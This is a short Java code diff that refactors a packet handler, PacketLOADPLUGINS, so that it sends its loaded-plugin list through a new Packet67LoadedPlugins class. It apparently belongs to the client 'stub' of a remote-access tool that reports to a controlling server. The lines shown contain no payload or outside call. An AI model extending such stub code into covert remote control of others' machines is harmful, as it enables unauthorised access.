@@ -2,21 +2,14 @@ package com.redpois0n.packets.incoming;
 
 import com.redpois0n.Connection;
 import com.redpois0n.Plugin;
-import com.redpois0n.packets.outgoing.Header;
+import com.redpois0n.stub.packets.outgoing.Header;
+import com.redpois0n.stub.packets.outgoing.Packet67LoadedPlugins;
 
 public class PacketLOADPLUGINS extends AbstractIncomingPacket {
 
 	@Override
 	public void read() throws Exception {
-		PacketBuilder packet = new PacketBuilder(Header.PLUGINS);
-
-		packet.add(Plugin.list.size());
-		
-		for (Plugin p : Plugin.list) {
-			packet.add(p.name);
-		}
-		
-		Connection.addToSendQueue(packet);
+		Connection.addToSendQueue(new Packet67LoadedPlugins());
 	}
 
 }
